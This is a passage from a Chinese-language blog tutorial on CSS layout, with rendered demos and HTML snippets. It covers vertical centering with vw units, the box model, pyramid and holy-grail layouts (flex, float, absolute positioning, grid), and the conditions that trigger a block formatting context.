class="hljs-string">&quot;position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center&quot;</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到，为了实现效果我们用了三层div。实际的效果是由第二层div完成 <em>“实现一个div垂直居中, 其距离屏幕左右两边各10px, 其高度始终是宽度的50%”</em> 的要求。第三层div完成 <em>“同时div中有一个文字A，文字需要水平垂直居中”</em> 的要求。</p><p>因为第二层div要求垂直居中，我们便在它外面加了一层div设置flex布局从而设置垂直居中。此外最外层的div还实现了左右10px外间距的要求。</p><p>我们注意到最里层div 还设置为了绝对定位，这有什么作用呢？按理说最里层div只需要设置flex布局就可以十分轻松的把文字A垂直水平据中。这是因为如果不设置绝对定位，最里层div的 height 的百分比是只有 父元素即第二层div 的 <code>Content-Box</code>的高度的，而第二层由于要实现高度是宽度的一半的效果，将 height设置为了0，所以按理说最里层div 的height设置的百分比怎么设置最后的值都是0。这就没法实现垂直居中了!</p><p>好在另一个黑科技拯救了我们，即当子元素设置为绝对定位时，height的百分比将 为 <code>Padding-Box</code>，即包含了内边距，这样我们就能得到真正的高度了！</p></li><li><p>用上面这种黑科技实现了目的，但是我们的代价也是很大了，为了使用 padding-bottom ，最里层的div元素还需要设置绝对定位来得到包含内边距的高度。其实利用CSS里面强大的单位 <code>vw</code> 就能优雅的解决这个问题而不使用任何黑科技。</p><p>vw和vh为相对应 1vh 意味着值为视口高度的 1%，1vw 即值为视口宽度的 1%。有了vw这个强大的单位我们非常容易就能达成高度是宽度的一半这个条件了！只需要设置 <code>heihgt: 50vw</code>。</p> <div style="width: 100%; display: flex; justify-content: center">     <iframe src="https://wuuconix.github.io/static/magic-vh.html" title="magic-vh" width="80%" height="300" scrolling="no" style="">     <p>Your browser does not support iframes.</p>     </iframe> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; heihgt: 100%; position: relative&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin: 0 10px; width: calc(100vw - 20px); height: 50vw; position: absolute; top: 50%; transform: translateY(-50%); display: flex; justify-content: center; align-items: center; background-color: darkorange&quot;</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到这种方法让结构简单了许多，只有两层div了。</p><p>由于直接使用视窗的百分比，直接放在博客里的话就溢出文章了。所以这里的演示实际上用了iframe，实际的页面在 <a href="https://wuuconix.github.io/static/magic-vh.html">https://wuuconix.github.io/static/magic-vh.html</a></p></li></ol><h2 id="5-盒模型"><a class="markdownIt-Anchor" href="#5-盒模型"></a> 5. 盒模型</h2><p>有两种盒模型，分别是 W3C标准盒模型 和 IE盒模型。</p><p>它们的区别在于对宽度和高度的定义。但是它们盒子的组成部分实际上都是一样的，即 <code>Content-Padding-Border-Margin</code>。</p><p><img src="https://th.bing.com/th/id/R.a00caf826c24abcfc6fae00e8e2ea828?rik=6mcUiMpH0mdM1A&amp;riu=http%3a%2f%2fimg.htmleaf.com%2f1603%2fcss-boxes-model.jpg&amp;ehk=TMxucgf1EWJ6Lj7PpGa8YTUrLtKK5c39BtEcao%2fBLow%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" alt="盒模型" /></p><p>它们元素的最终宽度和高度都是一样的，即Content+Padding+Border。</p><blockquote><p>在浏览器里用元素审查 查看元素的宽和高 不包括margin。所以这里把元素的最终高度看作这三者之和。</p></blockquote><p>唯一的区别在于width 和 height。我们知道，对于块级元素我们是可以设置宽高的。对于标准盒模型，width代表的是content的宽度，至于另外设置padding和border那是另外算，所以最终的元素的实际宽度可能会大于 width的设定值。</p><p>而IE盒模型的width指的是 content + padding + border的值。所以按照之前对最终宽高的定义，IE盒模型定义的width便是元素最终的宽高。实际上感觉也是非常方便的，并不像别人说的那么怪异。</p><p>在CSS中可以利用 <code>box-sizing: content-box / border-box</code> 来切换两种盒子模型。浏览器默认使用 content-box 标准盒模型。</p><p>下面给出两种模型在width都设置为500px，height都设置为32px，设置内边距5px和边框5px的外观比较。</p><div style="width: 100%; height: 50px; display: flex; justify-content: center; align-items: center">    <div style="box-sizing: border-box; width: 500px; height: 32px; padding: 5px; border: 5px dotted darkorange; margin: 10px 5px; background-color: deepskyblue; color: white; display: flex; justify-content: center; align-items: center">我是IE盒模型    </div></div><div style="width: 100%; height: 50px; display: flex; justify-content: center; align-items: center">    <div style="box-sizing: content-box; width: 500px; height: 32px; padding: 5px; border: 5px dotted  deepskyblue; margin: 10px 5px; background-color: darkorange; color: white; display: flex; justify-content: center; align-items: center">我是标准盒模型</div></div><p>可以看到IE盒模型另设padding和border后总宽度和宽度保持不变，标准盒模型因为是在content的基础再再加，所以比起来大了许多。</p><h2 id="6-css如何进行品字布局"><a class="markdownIt-Anchor" href="#6-css如何进行品字布局"></a> 6. CSS如何进行品字布局？</h2><p>品字型布局 局如其字，不多说，直接放效果。</p><ol><li><p>如果是全屏的品字形。</p> <div style="width: 100%; height: 32px; line-height: 32px; text-align: center; background-color: coral; color: white">1</div> <div style="float: left; width: 50%; height: 32px; line-height: 32px; text-align: center; background-color: cornflowerblue; color: white">2</div> <div style="float: left; width: 50%; height: 32px; line-height: 32px; text-align: center; background-color: hotpink; color: white">2</div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; line-height: 32px; text-align: center; background-color: coral&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; width: 50%; height: 32px; line-height: 32px; text-align: center; background-color: cornflowerblue;&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; width: 50%; height: 32px; line-height: 32px; text-align: center; background-color: hotpink;&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>底下两个div因为要放到一起，利用了float布局。</p></li><li><p>如果把每个div都设置为100px的正方形，会麻烦一些。</p> <div style="width: 100px; height: 100px; margin-left: 50%; transform: translateX(-50%); line-height: 100px; text-align: center; background-color: chartreuse; color: black">1</div> <div style="float: left; width: 100px; height: 100px; margin-left: 50%; transform: translateX(-100%); line-height: 100px; text-align: center; background-color: darkred; color: white">2</div> <div style="float: left; width: 100px; height: 100px; transform: translateX(-100%); line-height: 100px; text-align: center; background-color: cornflowerblue; color: white">3</div> <div style="height: 0p; clear: both"></div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100px; height: 100px; margin-left: 50%; transform: translateX(-50%); line-height: 100px; text-align: center; background-color: chartreuse; color: black&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; width: 100px; height: 100px; margin-left: 50%; transform: translateX(-100%); line-height: 100px; text-align: center; background-color: darkred; color: white&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; width: 100px; height: 100px; transform: translateX(-100%); line-height: 100px; text-align: center; background-color: cornflowerblue; color: white&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>从这里我们可以学习到两个新知识点：我们一般水平居中的时候可能会利用 <code>top: 50%; transform: translateX(-50%)</code>的方法，但是这样做首先需要设置为绝对定位。但是可以看到这里的第一个div利用了<code>margin-left: 50%; transform: translateX(-50%);</code>，利用<code>margin-left</code>的方式来把自己div的左边界顶到中心线上，而设置左外边界是不需要设置绝对定位的，十分优雅。</p><p>第二个知识点是 一个div transform后，后面的元素貌似还是会认为它在本来的位置，这也是为什么第三个div还需要 transform的原因，按理说直接<code>float: left</code>就ok了。 下面是取消第三个div变形后的结果。</p> <div style="width: 100px; height: 100px; margin-left: 50%; transform: translateX(-50%); line-height: 100px; text-align: center; background-color: chartreuse; color: black">1</div> <div style="float: left; width: 100px; height: 100px; margin-left: 50%; transform: translateX(-100%); line-height: 100px; text-align: center; background-color: darkred; color: white">2</div> <div style="float: left; width: 100px; height: 100px; line-height: 100px; text-align: center; background-color: cornflowerblue; color: white">3</div> <div style="height: 0p; clear: both"></div><p>这就好像div2 仍然在那个地方。</p></li></ol><h2 id="7-css如何进行圣杯布局"><a class="markdownIt-Anchor" href="#7-css如何进行圣杯布局"></a> 7. CSS如何进行圣杯布局</h2><ol><li><p>圣杯布局用flex来实现是非常简单的，只需要将左右两块设置好宽度后将所有的剩余空间分配给中间的元素。</p> <div style="width: 100%; height: 32px; background-color: palevioletred; display: flex; justify-content: center; align-items: center; color: white">头部</div> <div style="width: 100%; height: 32px; display: flex; justify-content: space-between; align-items: center;">     <div style="width: 100px; height: 100%; background-color: dodgerblue; display: flex; justify-content: center; align-items: center; color: white">左侧</div>     <div style="flex: 1; height: 100%; background-color: lightgreen; display: flex; justify-content: center; align-items: center; color: black">flex</div>     <div style="width: 100px; height: 100%; background-color: dodgerblue; display: flex; justify-content: center; align-items: center; color: white">右侧</div> </div> <div style="width: 100%; height: 32px; background-color: palevioletred; display: flex; justify-content: center; align-items: center; color: white">尾部</div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; display: flex; justify-content: center; align-items: center; color: white&quot;</span>&gt;</span>头部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; display: flex; justify-content: space-between; align-items: center;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100px; height: 100%; background-color: dodgerblue; display: flex; justify-content: center; align-items: center; color: white&quot;</span>&gt;</span>左侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;flex: 1; height: 100%; background-color: lightgreen; display: flex; justify-content: center; align-items: center; color: black&quot;</span>&gt;</span>flex<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100px; height: 100%; background-color: dodgerblue; display: flex; justify-content: center; align-items: center; color: white&quot;</span>&gt;</span>右侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; display: flex; justify-content: center; align-items: center; color: white&quot;</span>&gt;</span>尾部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码真就全员flex布局了。div里面文字的居中也用到了flex布局，实际上只要设置行高+text-align就行，但是flex真的是会用上瘾的，希望它没有滥用一说。</p><p>值得注意的是，中间一行的关键div中，justify-content的属性设置为了<code>space-between</code>，它可以让第一个元素与行首对齐，最后一个元素与行尾对齐。当然这里实际上设置啥值都行，因为宽度被占满了，因为有<code>flex:1</code>。而如果中间没有那个div，<code>space-between</code>的效果就出现了。</p> <div style="width: 100%; height: 32px; background-color: palevioletred; display: flex; justify-content: center; align-items: center; color: white">头部</div> <div style="width: 100%; height: 32px; display: flex; justify-content: space-between; align-items: center;">     <div style="width: 100px; height: 100%; background-color: dodgerblue; display: flex; justify-content: center; align-items: center; color: white">左侧</div>     <div style="width: 100px; height: 100%; background-color: dodgerblue; display: flex; justify-content: center; align-items: center; color: white">右侧</div> </div> <div style="width: 100%; height: 32px; background-color: palevioletred; display: flex; justify-content: center; align-items: center; color: white">尾部</div></li><li><p>第二种方法是使用简单版float布局，为什么说它简单呢？因为只需要分别设置左侧为<code>float: left</code>，右侧为<code>float: right</code>，中间的元素直接<code>width: 100%</code>即可，因为float的元素是脱离标准流的。</p> <div style="width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white">头部</div> <div style="width: 100%; height: 32px; overflow: hidden">     <div style="float: left; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white">左侧</div>     <div style="float: right; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white">右侧</div>     <div style="width: 100%; height: 32px; background-color: lightsalmon; line-height: 32px; text-align: center; color: white">float</div> </div> <div style="width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white">尾部</div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>头部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>左侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>右侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: lightsalmon; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>float<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>尾部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要注意的是，中间的div由于没有使用float布局，它需要被放在最后，如果按照普通的写法，把它放在中间，那么右侧的div会放不下而到下一行。</p> <div style="width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white">头部</div> <div style="width: 100%; height: 32px;">     <div style="float: left; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white">左侧</div>     <div style="width: 100%; height: 32px; background-color: lightsalmon; line-height: 32px; text-align: center; color: white">float</div>     <div style="float: right; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white">右侧</div>     <div style="height: 0; clear: both;"></div> </div> <div style="width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white">尾部</div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>头部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>左侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: lightsalmon; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>float<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right; width: 100px; height: 32px; background-color: dodgerblue; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>右侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 0; clear: both;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>尾部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以这么说，不浮动的元素将无视浮动的元素，因为浮动的元素已经 <strong>“浮起来了”</strong> 。而浮动元素在浮动时会收到非浮动元素的影响，可以这么想，它们一开始都还没有浮起来，然后根据float设置的不同，去顶着不同的界后再上浮。</p><p>因为<code>右侧div</code>需要顶着右界，而 <code>中间div</code>已经占满了哪一行，<code>右侧div</code>被迫换行顶着右侧的边界，再上浮。</p></li><li><p>使用绝对定位布局。由于块级元素如果不使用flex、float或者不转化为inline-block等，正常情况下是分行的。但是如果使用绝对定位，也可以打破这个规则。我们将中间的三个div全部设置为绝对定位。</p> <div style="width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white">头部</div> <div style="width: 100%; height: 32px; position: relative">     <div style="position: absolute; left: 0; width: 100px; height: 32px; line-height: 32px; text-align: center; color: white; background: dodgerblue">左侧</div>     <div style="position: absolute; left: 100px; width: calc(100% - 200px); height: 32px; line-height: 32px; text-align: center; color: white; background: darkcyan">绝对定位</div>     <div style="position: absolute; right: 0; width: 100px; height: 32px; line-height: 32px; text-align: center; color: white; background: dodgerblue">右侧</div> </div> <div style="width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white">尾部</div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>头部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; position: relative&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; left: 0; width: 100px; height: 32px; line-height: 32px; text-align: center; color: white; background: dodgerblue&quot;</span>&gt;</span>左侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; left: 100px; width: calc(100% - 200px); height: 32px; line-height: 32px; text-align: center; color: white; background: darkcyan&quot;</span>&gt;</span>绝对定位<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; right: 0; width: 100px; height: 32px; line-height: 32px; text-align: center; color: white; background: dodgerblue&quot;</span>&gt;</span>右侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; height: 32px; background-color: palevioletred; line-height: 32px; text-align: center; color: white&quot;</span>&gt;</span>尾部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>绝对定位的思路是设置左侧div<code>left: 0</code>以及右侧div<code>right: 0</code>，中间的元素就设置<code>left: 100px; width: calc(100% - 200px)</code>或者<code>left: 100px; right: 100px</code>。</p></li><li><p>最后介绍的实现方法是利用<code>grid</code>布局，它是CSS原生网格布局，简洁优雅又强大。</p> <div style="display: grid; grid-template-rows: repeat(3, 32px); grid-template-columns: 100px calc(100% - 200px) 100px;">     <div style="grid-column: 1 / -1; grid-row: 1 / 2; background-color: palevioletred; color: white; line-height: 32px; text-align: center">头部</div>     <div style="grid-column: 1 / 2; grid-row: 2 / 3; background-color: dodgerblue; color: white; line-height: 32px; text-align: center">左侧</div>     <div style="grid-column: 2 / 3; grid-row: 2 / 3; background-color: paleturquoise; color: black; line-height: 32px; text-align: center">享受grid布局吧！</div>     <div style="grid-column: 3 / -1; grid-row: 2 / 3; background-color: dodgerblue; color: white; line-height: 32px; text-align: center">右侧</div>     <div style="grid-column: 1 / -1; grid-row: 3 / -1; background-color: palevioletred; color: white; line-height: 32px; text-align: center">尾部</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: grid; grid-template-rows: repeat(3, 32px); grid-template-columns: 100px calc(100% - 200px) 100px;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;grid-column: 1 / -1; grid-row: 1 / 2; background-color: palevioletred; color: white; line-height: 32px; text-align: center&quot;</span>&gt;</span>头部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;grid-column: 1 / 2; grid-row: 2 / 3; background-color: dodgerblue; color: white; line-height: 32px; text-align: center&quot;</span>&gt;</span>左侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;grid-column: 2 / 3; grid-row: 2 / 3; background-color: paleturquoise; color: black; line-height: 32px; text-align: center&quot;</span>&gt;</span>享受grid布局吧！<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;grid-column: 3 / -1; grid-row: 2 / 3; background-color: dodgerblue; color: white; line-height: 32px; text-align: center&quot;</span>&gt;</span>右侧<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;grid-column: 1 / -1; grid-row: 3 / -1; background-color: palevioletred; color: white; line-height: 32px; text-align: center&quot;</span>&gt;</span>尾部<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到，这次头部、左侧、中间、右侧、尾部变成了并列的兄弟元素，因为它们同在同一个网格中，我们将最外层的包裹div设置为grid布局，同时设置3行3列，每一行的高度都是32px，列则不一样，第一列和第三列是100px，第二列是<code>calc(100% - 200px)</code>。这个网格列数一设置后，哪些应该放哪里已经一清二楚了。</p></li></ol><h2 id="8-css如何实现双飞翼布局"><a class="markdownIt-Anchor" href="#8-css如何实现双飞翼布局"></a> 8. CSS如何实现双飞翼布局？</h2><p>我看了一下，双飞翼布局和圣杯布局几乎没有区别，主要特点都是左右两个div固定宽度，中间那个div自适应，如果面试遇到了直接按照 <a href="#7-css如何进行圣杯布局" class="tocbot-link node-name--H2 ">7. CSS如何进行圣杯布局</a> 来答就行。</p><h2 id="9-什么是bfc"><a class="markdownIt-Anchor" href="#9-什么是bfc"></a> 9. 什么是BFC？</h2><p>BFC我们之前在用<code>overflow:hidden</code>清除浮动的时候见过。</p><p>它的全称是 <strong>Block Formatting Context</strong> 翻译为 <strong>块格式上下文</strong></p><blockquote><p>MDN-zh-CN: 它是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域</p><p>MDN-en-US: It’s the region in which the layout of block boxes occurs and in which floats interact with other elements.</p></blockquote><h2 id="10-bfc触发条件"><a class="markdownIt-Anchor" href="#10-bfc触发条件"></a> 10. BFC触发条件</h2><p>以下触发条件来自于<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context">MDN</a></p><ol><li><p>根元素 即 html标签</p></li><li><p>浮动元素 float不为none的元素</p></li><li><p>绝对定位元素 元素的的position为 absolute / fixed</p></li><li><p>行内块元素 display: inline-block</p></li><li><p>表格单元格 display: table-cell</p></li><li><p>表格标题 display: table-caption</p></li><li><p>匿名表格单元格元素  display: table / table-row / table-row-group / table-header-group / table-footer-group / inline-table。</p><blockquote><p>值得注意的是inline-table之前的这些display分别是 table, row, tbody, thead, tfoot的默认属性。</p><p>结合<strong>5,6,7</strong>条，我们貌似可以这样记忆，和table相关的所有东西都会触发BFC。</p></blockquote></li><li><p>overflow 不为 visible的块元素。</p></li><li><p>display 为 flow-root的元素。</p><blockquote><p>一个新的 display 属性的值，它可以创建无副作用的 BFC。在父级块中使用 display: flow-root 可以创建新的 BFC。</p><p>给 div 设置 display: flow-root 属性后，div 中的所有内容都会参与 BFC，浮动的内容不会从底部溢出。</p><p>关于值 flow-root的这个名字，当你明白你实际上是在创建一个行为类似于根元素 （浏览器中的html元素） 的东西时，就能发现这个名字的意义了——即创建一个上下文，里面将进行 flow layout</p></blockquote></li><li><p>contain: layout / content / paint 的元素</p><blockquote><p>contain 属性允许开发者声明当前元素和它的内容尽可能的独立于 DOM 树的其他部分。这使得浏览器在重新计算布局、样式、绘图、大小或这四项的组合时，只影响到有限的 DOM 区域，而不是整个页面，可以有效改善性能。</p><p>contain: conetent 等价于 contain: layout paint</p><p>contain: layout 表示元素外部无法影响元素内部的布局，反之亦然。【大概就是内网元素互补影响布局】</p><p>contain: paint 表示这个元素的子孙节点不会在它边缘外显示。如果一个元素在视窗外或因其他原因导致不可见，则同样保证它的子孙节点不会被显示。</p></blockquote></li><li><p>弹性元素 display: flex 或者 inline-flex元素的直接子元素</p></li><li><p>网格元素 display: grid 或者 inline-grid元素的直接子元素</p></li><li><p>多列容器 【元素的column-count 或者 content-width 